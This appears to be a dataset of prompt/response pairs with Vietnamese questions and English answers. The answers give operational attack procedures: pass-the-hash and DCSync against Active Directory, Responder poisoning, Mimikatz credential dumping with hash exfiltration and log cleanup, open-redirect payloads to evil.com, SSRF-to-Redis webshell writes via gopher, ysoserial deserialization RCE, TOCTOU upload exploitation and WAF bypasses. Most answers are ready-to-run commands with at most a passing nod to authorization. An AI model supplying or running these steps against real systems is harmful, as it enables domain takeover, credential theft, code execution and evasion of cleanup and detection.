prompt: Đã lấy được NT hash của một admin domain. Cách dùng kỹ thuật Pass-the-Hash để đăng nhập mà không cần mật khẩu?
response: Pass-the-Hash uses an NT hash in place of a password. Steps: (1) obtain hashes (mimikatz `sekurlsa::logonpasswords` or SAM dump), (2) authenticate with Impacket: `psexec.py domain/user@10.0.0.8 -hashes :aad3b435b51404eeaad3b435b51404ee:NN` (empty LM plus 32-char NT), (3) for quieter lateral movement use `wmiexec.py` or `smbexec.py` with the same flag, (4) validate access quickly with `crackmapexec smb target -u admin -H NN -x whoami`, (5) pivot across the subnet, (6) note this works only for NTLM auth, not Kerberos — use it when Kerberos is unavailable.

prompt: Vừa kiểm soát được một account domain. Muốn map toàn bộ AD attack path bằng BloodHound — thu thập dữ liệu và đọc kết quả thế nào?
response: BloodHound maps AD attack paths from graph relationships. Steps: (1) collect with `SharpHound.exe -c All` on Windows, or `python bloodhound.py -u user -p pass -d domain -c All -ns DCIP` from Linux, (2) import the resulting JSON zip into BloodHound — run Neo4j first: `docker run -p 7474:7474 -p 7687:7687 neo4j`, (3) run precomputed queries: Shortest path to Domain Admins, members of high-value groups, principals with GenericAll or WriteDacl, (4) choose the shortest validated path, (5) execute the abuse: reset password, add to a privileged group, or DCSync if replication rights exist, (6) re-run the query after each step to confirm the path is still intact.

prompt: LLMNR poisoning là gì, và muốn thực hành trong phòng lab riêng thì bắt đầu từ đâu?
response: LLMNR poisoning intercepts name resolution when hosts cannot reach DNS. In a segment of your lab: (1) run Responder on the attacker host: `sudo responder -I eth0 -wdP`, (2) it answers LLMNR/NBT-NS broadcast queries with your IP, (3) when a victim tries `\\fileshare` and DNS fails, their NetNTLMv2 auth challenge lands on you, (4) capture the hash and crack: `hashcat -m 5600 hashes.txt rockyou.txt`, then pass-the-hash, (5) alternative: relay instead of crack with ntlmrelayx to a signing-disabled SMB host, (6) detection: monitor event 4697/4688 for responder child processes. Keep it inside the segmented lab.

prompt: Giải thích Responder hoạt động thế nào và các flag quan trọng khi khởi chạy lần đầu.
response: Responder lures Windows network authentication toward your host by responding to name-resolution broadcasts. Key flags: `-I eth0` sets the interface, `-w` enables WPAD proxy authentication (browsers auto-detect and leak creds), `-P` forces NTLM downgrade for capturing, `-d` serves DHCP. A basic run: `sudo responder -I eth0 -wdP`. Steps: (1) sniff for LLMNR/NBT-NS broadcast traffic — the more Windows clients, the more hits, (2) a victim mounting a UNC path or browsing triggers auth capture, (3) hashes land in `logs/` under per-service files, (4) crack or relay them, (5) turn off services you do not need in `responder.conf` to reduce noise and false positives.

prompt: Mimikatz dùng để làm gì? Liệt kê các module chính liên quan credential mà một red team cần biết, và trình tự an toàn khi dùng.
response: Mimikatz reads Windows credentials straight from memory. Core modules: `privilege::debug` first to gain the needed rights, `sekurlsa::logonpasswords` dumps plaintext passwords plus NTLM and Kerberos tickets from LSASS, `lsadump::sam` grabs local SAM hashes, `lsadump::dcsync /domain:X /user:Administrator` pulls any account hash from the DC, `kerberos::golden` forges Golden Tickets, `sekurlsa::tickets /export` exports tickets for pass-the-ticket. Safe red-team flow: dump locally, exfiltrate hashes, crack or relay offline, then clean log artifacts. Only run where you hold explicit authorization.

prompt: Login flow có tham số next/return dùng để redirect sau đăng nhập. Tìm open redirect / URL injection trong luồng này thế nào?
response: Open redirect in login/logout flows: (1) enumerate redirect params — `next`, `return`, `redirect`, `url`, `goto`, (2) test payloads: `//evil.com`, `https:evil.com`, `\evil.com`, double encoding `%2f%2fevil.com`, or `https://trusted.evil.com`, (3) send with curl and read the Location header without following: `curl -I -s 'https://app/login?next=//evil.com'`, (4) confirm the 3xx target, (5) verify it chains to a phishing scenario (credential capture after login), (6) severity is medium — a social-engineering enabler, not a direct takeover. Document the exact bypass payload in the report.

prompt: App bị SSRF nhưng chỉ cho HTTP. Muốn nâng cấp SSRF thành RCE qua gopher:// nói chuyện với Redis. Các bước?
response: Gopher URLs turn SSRF into internal protocol abuse (Redis, MySQL, HTTP). Steps: (1) confirm plain SSRF first: `...?url=http://127.0.0.1:6379`, (2) encode Redis commands into a gopher blob: `gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall...`, URL-encode every CRLF, (3) send through the SSRF param — Redis executes the queued commands, (4) classic chain: `CONFIG SET dir /var/www` plus `CONFIG SET dbfilename shell.php` to write a webshell, (5) for local file reads use `file:///etc/passwd`, (6) scan internal ports first with a fast loop so you know which service to speak to before encoding the payload.

prompt: App .NET dùng Newtonsoft.Json để deserialize dữ liệu người dùng. Test deserialization attack thành RCE ra sao?
response: .NET deserialization with Newtonsoft.Json is exploitable when `TypeNameHandling` is set to Objects/All. Steps: (1) craft a JSON object with a `$type` key to force type binding: `{"$type":"System.Windows.Data.ObjectDataProvider, PresentationFramework",...}`, (2) chain `ObjectDataProvider.MethodName=Start` with `ProcessStartInfo` to execute commands, (3) generate a ready payload: `ysoserial.exe -g ObjectDataProvider -f Json.Net -c "cmd /c calc"`, (4) send the serialized blob to the Sink endpoint, (5) if TypeNameHandling is None, hunt for `BinaryFormatter` or `JavaScriptSerializer` call sites that call `Deserialize` with attacker data, (6) confirm execution then report the exact type-name and gadget used.

prompt: Upload file có quét nội dung trước khi lưu. Nghi ngờ bị race condition double-fetch kiểu TOCTOU — test và khai thác thế nào?
response: TOCTOU file upload: the server checks content, then writes from the request — two concurrent requests can race past the check. Steps: (1) capture the upload request in Burp, (2) replay it in parallel loops or Turbo Intruder while the scanner inspects the file, (3) one thread passes the benign content check while another lands the actual file, (4) if stored under its original name, hit `/uploads/payload.php`, (5) also test related gaps: rename-after-check, content-type mismatch, null-byte truncation `evil.php%00.png`, (6) the race window depends on check complexity — vary file size and concurrency to widen it. This turns sandbox-style scanners into code execution.

prompt: WAF kiểm tra kỹ tham số GET nhưng có vẻ bỏ qua body JSON. Bypass bằng JSON body thế nào?
response: A WAF that scans urlencoded and GET params often ignores JSON bodies entirely. Steps: (1) fingerprint: `wafw00f https://target`, (2) convert the SQLi/XSS to JSON shapes: `{"name":"admin' /*"}` or `{"q":"<svg/onload=alert(1)>"}`, (3) send with `Content-Type: application/json`, then vary structure — array of objects `[{"a":"1"},{"b":"UNION"}]`, duplicate keys `{"x":1,"x":"SELECT"}`, (4) some WAFs only normalize the first key, so key order matters, (5) try gzip-encoded bodies (`Content-Encoding: gzip`) since regex engines often parse raw compressed bytes, (6) confirm the backend reflects or executes the payload to prove the bypass.
